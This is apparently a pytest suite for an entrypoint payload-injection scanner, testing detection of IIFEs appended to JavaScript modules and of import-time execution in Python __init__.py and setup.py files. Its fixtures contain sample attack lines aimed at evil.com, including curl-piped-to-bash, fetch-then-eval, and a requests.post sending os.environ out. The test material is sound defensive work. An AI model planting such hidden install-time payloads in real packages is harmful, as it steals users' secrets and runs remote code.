"""Tests for scan_entrypoint.py - Entrypoint Payload Injection Scanner."""

import json
import scan_entrypoint as scanner


class TestJsIifeInjection:
    """JavaScript CJS entrypoint IIFE injection detection."""

    def test_node_ipc_reproduction(self, tmp_path):
        """node-ipc pattern: package.json with main field, CJS file ending
        with IIFE containing require('child_process') -> CRITICAL."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "node-ipc",
            "main": "node-ipc.cjs",
        }))
        cjs = tmp_path / "node-ipc.cjs"
        cjs.write_text(
            "// node-ipc - legitimate IPC library\n"
            "const net = require('net');\n"
            "\n"
            "class IPC {\n"
            "  constructor() { this.connections = []; }\n"
            "  connect(path) { return net.createConnection(path); }\n"
            "}\n"
            "\n"
            "module.exports = IPC;\n"
            "\n"
            "// --- injected payload below ---\n"
            "(function(){\n"
            "  const cp = require('child_process');\n"
            "  cp.execSync('curl http://evil.com/steal | bash');\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "node-ipc.cjs")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert any("entrypoint-iife" == f.category for f in critical)
        assert any("child_process" in f.description for f in critical)

    def test_iife_after_legitimate_exports(self, tmp_path):
        """IIFE at end of legitimate module (normal exports above) -> HIGH."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "const utils = require('./utils');\n"
            "\n"
            "function processData(data) {\n"
            "  return utils.transform(data);\n"
            "}\n"
            "\n"
            "module.exports = { processData };\n"
            "\n"
            "(function(){\n"
            "  console.log('suspicious self-executing code');\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        assert len(findings) >= 1
        iife_findings = [f for f in findings if f.category == "entrypoint-iife"]
        assert len(iife_findings) >= 1
        # No dangerous patterns, so should be HIGH not CRITICAL
        assert any(f.severity == "high" for f in iife_findings)

    def test_minified_iife_arrow(self, tmp_path):
        """Minified IIFE: (()=>{...})() at end of file -> HIGH."""
        cjs = tmp_path / "index.cjs"
        cjs.write_text(
            "const x = require('./lib');\n"
            "module.exports = x;\n"
            "\n"
            "(()=>{\n"
            "  let a = 1 + 2;\n"
            "  console.log(a);\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.cjs")
        iife_findings = [f for f in findings if f.category == "entrypoint-iife"]
        assert len(iife_findings) >= 1
        assert any(f.severity == "high" for f in iife_findings)

    def test_iife_with_network_access_is_critical(self, tmp_path):
        """IIFE with fetch() to external URL should be CRITICAL."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "module.exports = {};\n"
            "\n"
            "(function(){\n"
            "  fetch('https://evil.com/payload').then(r => r.text()).then(eval);\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1

    def test_module_exports_reassignment(self, tmp_path):
        """Duplicate module.exports at bottom -> HIGH."""
        cjs = tmp_path / "index.js"
        # Build a file large enough that the second export is in the bottom 20%
        lines = ["// line " + str(i) for i in range(20)]
        lines.insert(0, "module.exports = { safe: true };")
        lines.append("module.exports = { evil: true };")
        cjs.write_text('\n'.join(lines))
        findings = scanner.scan_file(str(cjs), "index.js")
        reassign_findings = [f for f in findings if "Reassignment" in f.title]
        assert len(reassign_findings) >= 1
        assert reassign_findings[0].severity == "high"


class TestJsFalsePositives:
    """False positive resistance for JavaScript IIFE detection."""

    def test_webpack_banner_not_flagged(self, tmp_path):
        """IIFE in a file with webpack banner should NOT fire."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "/*! webpack bundle output */\n"
            "/******/ (function(modules) {\n"
            "  // webpack bootstrap\n"
            "  var installedModules = {};\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        iife_findings = [f for f in findings if f.category == "entrypoint-iife"]
        assert len(iife_findings) == 0

    def test_rollup_banner_not_flagged(self, tmp_path):
        """IIFE in a file with rollup banner should NOT fire."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "// rollup compiled output\n"
            "'use strict';\n"
            "(function () {\n"
            "  var exports = {};\n"
            "  exports.default = 42;\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        iife_findings = [f for f in findings if f.category == "entrypoint-iife"]
        assert len(iife_findings) == 0

    def test_esbuild_banner_not_flagged(self, tmp_path):
        """IIFE in a file with esbuild banner should NOT fire."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "/* esbuild generated */\n"
            "(()=>{var e=require('fs');module.exports=e;})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        iife_findings = [f for f in findings if f.category == "entrypoint-iife"]
        assert len(iife_findings) == 0

    def test_clean_module_no_findings(self, tmp_path):
        """A clean module with normal exports should produce no findings."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "const path = require('path');\n"
            "\n"
            "function resolve(p) {\n"
            "  return path.resolve(__dirname, p);\n"
            "}\n"
            "\n"
            "module.exports = { resolve };\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        assert len(findings) == 0

    def test_non_js_file_not_scanned(self, tmp_path):
        """Non-JS files should produce no findings even with IIFE-like content."""
        txt = tmp_path / "readme.txt"
        txt.write_text("(function(){ evil(); })()\n")
        findings = scanner.scan_file(str(txt), "readme.txt")
        assert len(findings) == 0


class TestPythonImportTimeExecution:
    """Python entrypoint import-time execution detection."""

    def test_init_subprocess_run(self, tmp_path):
        """__init__.py with top-level subprocess.run() -> CRITICAL."""
        pkg = tmp_path / "evil_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import subprocess\n"
            "\n"
            "subprocess.run(['curl', 'http://evil.com/payload'])\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "evil_pkg/__init__.py")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert any("entrypoint-import-exec" == f.category for f in critical)
        assert any("subprocess.run" in f.description for f in critical)

    def test_init_urllib_urlopen(self, tmp_path):
        """__init__.py with top-level urllib.request.urlopen() -> CRITICAL."""
        pkg = tmp_path / "evil_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import urllib.request\n"
            "\n"
            "data = urllib.request.urlopen('http://evil.com/c2').read()\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "evil_pkg/__init__.py")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert any("urllib.request.urlopen" in f.description for f in critical)

    def test_setup_py_os_system(self, tmp_path):
        """setup.py with top-level os.system() -> HIGH."""
        setup = tmp_path / "setup.py"
        setup.write_text(
            "import os\n"
            "from setuptools import setup\n"
            "\n"
            "os.system('curl http://evil.com/install | bash')\n"
            "\n"
            "setup(\n"
            "    name='evil-package',\n"
            "    version='1.0.0',\n"
            ")\n"
        )
        findings = scanner.scan_python_entrypoint(str(setup), "setup.py")
        high_or_critical = [f for f in findings if f.severity in ("high", "critical")]
        assert len(high_or_critical) >= 1
        assert any("os.system" in f.description for f in high_or_critical)

    def test_init_exec_with_obfuscated_arg(self, tmp_path):
        """__init__.py with exec(decode(...)) -> CRITICAL."""
        pkg = tmp_path / "evil_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import base64\n"
            "\n"
            "exec(base64.b64decode('cHJpbnQoJ3B3bmVkJyk='))\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "evil_pkg/__init__.py")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert any("exec()" in f.title for f in critical)

    def test_init_requests_post(self, tmp_path):
        """__init__.py with top-level requests.post() -> CRITICAL."""
        pkg = tmp_path / "evil_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import os\n"
            "import requests\n"
            "\n"
            "requests.post('http://evil.com/exfil', json=dict(os.environ))\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "evil_pkg/__init__.py")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1
        assert any("requests.post" in f.description for f in critical)

    def test_init_socket_creation(self, tmp_path):
        """__init__.py with top-level socket.socket() -> CRITICAL."""
        pkg = tmp_path / "evil_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import socket\n"
            "\n"
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "evil_pkg/__init__.py")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) >= 1


class TestPythonFalsePositives:
    """False positive resistance for Python entrypoint detection."""

    def test_os_path_dirname_not_flagged(self, tmp_path):
        """__init__.py with os.path.dirname() at top level -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import os\n"
            "\n"
            "PKG_DIR = os.path.dirname(os.path.abspath(__file__))\n"
            "DATA_DIR = os.path.join(PKG_DIR, 'data')\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0

    def test_constant_assignments_not_flagged(self, tmp_path):
        """__init__.py with only constant assignments -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "__version__ = '1.0.0'\n"
            "__author__ = 'Test Author'\n"
            "DEFAULT_TIMEOUT = 30\n"
            "SUPPORTED_FORMATS = ['json', 'yaml', 'toml']\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0

    def test_name_main_guard_not_flagged(self, tmp_path):
        """if __name__ == '__main__' block -> NO finding."""
        setup = tmp_path / "setup.py"
        setup.write_text(
            "import os\n"
            "import subprocess\n"
            "from setuptools import setup\n"
            "\n"
            "setup(name='safe-package', version='1.0.0')\n"
            "\n"
            "if __name__ == '__main__':\n"
            "    subprocess.run(['python', '-m', 'pytest'])\n"
            "    os.system('echo done')\n"
        )
        findings = scanner.scan_python_entrypoint(str(setup), "setup.py")
        # Should not flag subprocess.run or os.system inside __name__ guard
        dangerous_findings = [f for f in findings if f.category == "entrypoint-import-exec"]
        assert len(dangerous_findings) == 0

    def test_function_body_not_flagged(self, tmp_path):
        """subprocess.run() inside a function definition -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import subprocess\n"
            "\n"
            "def run_command(cmd):\n"
            "    return subprocess.run(cmd, capture_output=True)\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0

    def test_class_body_not_flagged(self, tmp_path):
        """subprocess.Popen inside a class -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import subprocess\n"
            "\n"
            "class Runner:\n"
            "    def execute(self, cmd):\n"
            "        return subprocess.Popen(cmd)\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0

    def test_non_entrypoint_python_not_scanned(self, tmp_path):
        """Regular .py files (not __init__.py or setup.py) should not be scanned."""
        evil = tmp_path / "evil.py"
        evil.write_text(
            "import subprocess\n"
            "subprocess.run(['curl', 'http://evil.com'])\n"
        )
        findings = scanner.scan_python_entrypoint(str(evil), "evil.py")
        assert len(findings) == 0

    def test_import_statements_not_flagged(self, tmp_path):
        """Import statements at top level -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import os\n"
            "import sys\n"
            "from pathlib import Path\n"
            "from .core import main\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0

    def test_empty_init_not_flagged(self, tmp_path):
        """Empty __init__.py -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text("")
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0

    def test_logging_getlogger_not_flagged(self, tmp_path):
        """logging.getLogger() at top level -> NO finding."""
        pkg = tmp_path / "safe_pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import logging\n"
            "\n"
            "logger = logging.getLogger(__name__)\n"
        )
        findings = scanner.scan_python_entrypoint(str(init), "safe_pkg/__init__.py")
        assert len(findings) == 0


class TestHighEntropyAppended:
    """High-entropy appended content detection in JS files."""

    def test_high_entropy_block_at_end(self, tmp_path):
        """High-entropy base64-like block appended at end -> MEDIUM."""
        cjs = tmp_path / "index.js"
        # Base64-encoded payload has Shannon entropy > 4.5, crossing our threshold
        b64_payload = "VGhpcyBpcyBhIHNlY3JldCBwYXlsb2FkIHdpdGggcmFuZG9taXplZCBjb250ZW50IGZvciB0ZXN0aW5nIHRoZSBlbnRyb3B5"
        cjs.write_text(
            "module.exports = {};\n"
            f"var _x = '{b64_payload}';\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        entropy_findings = [f for f in findings if "entropy" in f.title.lower()]
        assert len(entropy_findings) >= 1
        assert entropy_findings[0].severity == "medium"

    def test_no_entropy_on_short_lines(self, tmp_path):
        """Short content at end should not trigger entropy check."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "module.exports = { x: 1 };\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        entropy_findings = [f for f in findings if "entropy" in f.title.lower()]
        assert len(entropy_findings) == 0


class TestScanFileIntegration:
    """Integration tests for the scan_file dispatch function."""

    def test_scan_file_python_init(self, tmp_path):
        """scan_file correctly routes __init__.py."""
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import subprocess\n"
            "subprocess.run(['whoami'])\n"
        )
        findings = scanner.scan_file(str(init), "pkg/__init__.py")
        assert len(findings) >= 1
        assert any(f.category == "entrypoint-import-exec" for f in findings)

    def test_scan_file_js_entrypoint(self, tmp_path):
        """scan_file correctly routes .js files."""
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "module.exports = {};\n"
            "(function(){\n"
            "  var x = 1;\n"
            "})()\n"
        )
        findings = scanner.scan_file(str(cjs), "index.js")
        assert len(findings) >= 1
        assert any(f.category == "entrypoint-iife" for f in findings)

    def test_scan_file_irrelevant_extension(self, tmp_path):
        """scan_file skips irrelevant file types."""
        md = tmp_path / "README.md"
        md.write_text("# Readme\n(function(){ evil(); })()\n")
        findings = scanner.scan_file(str(md), "README.md")
        assert len(findings) == 0


class TestCategoryDeduplication:
    """Verify categories are distinct from scan_sast and detect_trifecta_raw."""

    def test_categories_are_entrypoint_specific(self, tmp_path):
        """All findings use entrypoint-specific categories."""
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import subprocess\n"
            "subprocess.run(['curl', 'http://evil.com'])\n"
        )
        cjs = tmp_path / "index.js"
        cjs.write_text(
            "module.exports = {};\n"
            "(function(){ require('child_process').execSync('id'); })()\n"
        )

        py_findings = scanner.scan_file(str(init), "pkg/__init__.py")
        js_findings = scanner.scan_file(str(cjs), "index.js")

        all_findings = py_findings + js_findings
        assert len(all_findings) >= 2

        allowed_categories = {"entrypoint-iife", "entrypoint-import-exec"}
        for f in all_findings:
            assert f.category in allowed_categories, (
                f"Finding category '{f.category}' is not entrypoint-specific. "
                f"Must be one of {allowed_categories} to avoid dedup with scan_sast."
            )

    def test_scanner_name_is_entrypoint(self, tmp_path):
        """All findings have scanner='entrypoint'."""
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        init = pkg / "__init__.py"
        init.write_text(
            "import os\n"
            "os.system('whoami')\n"
        )
        findings = scanner.scan_file(str(init), "pkg/__init__.py")
        for f in findings:
            assert f.scanner == "entrypoint"
